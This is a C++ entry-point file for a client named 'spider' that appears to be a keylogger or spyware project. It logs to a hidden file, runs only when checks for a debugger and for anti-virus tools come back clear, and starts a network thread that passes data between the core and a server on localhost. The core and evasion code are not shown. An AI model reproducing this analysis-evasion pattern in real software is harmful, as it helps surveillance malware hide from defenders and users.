#include <cstdlib>
#include <thread>
#include "Logger.hpp"
#include "Core.h"
#include "Network.h"
#include "AntiDbg.h"

int main()
{
    int ret = EXIT_FAILURE;

    try
    {
#ifndef _WIN32
        nope::log::Logger::start("/tmp/.debug.log"); // TODO: rm
#else
        nope::log::Logger::start(".debug.log"); // TODO: rm
#endif
        nope::log::Logger::logLevel = nope::log::LogLevel::LOG_DEBUG;

        nope::log::Log(Info) << "Logger started";
    }
    catch (std::exception const &e)
    {
        std::cerr << "Fatal error while initializing the logger: " << e.what()
                  << std::endl;
        return ret;
    }

    try
    {
#ifndef _WIN32
        spider::client::core::Core core("/tmp/spider/");
#else
        spider::client::core::Core core("./");
#endif

        // Check for a debugger
        if (!spider::misc::Debugger::isBeingAV() && !spider::misc::Debugger::isDebuggerPresent())
        {
            // Start network thread
            spider::client::Network net(core.getSendToNetwork(), core.getReceivedFromNetwork());
            std::thread networkThread([&]() {
                net.run(12345, "127.0.0.1", true);
            });

            // Run core
            ret = core.run();

            // Stop thread
            if (networkThread.joinable())
            {
                networkThread.join();
            }
        }
    }
    catch (std::exception const &e)
    {
        nope::log::Log(Error) << e.what();
        ret = EXIT_FAILURE;
    }

    if (ret == EXIT_FAILURE)
    {
        std::cout << "Not today..." << std::endl;
    }
    return ret;
}
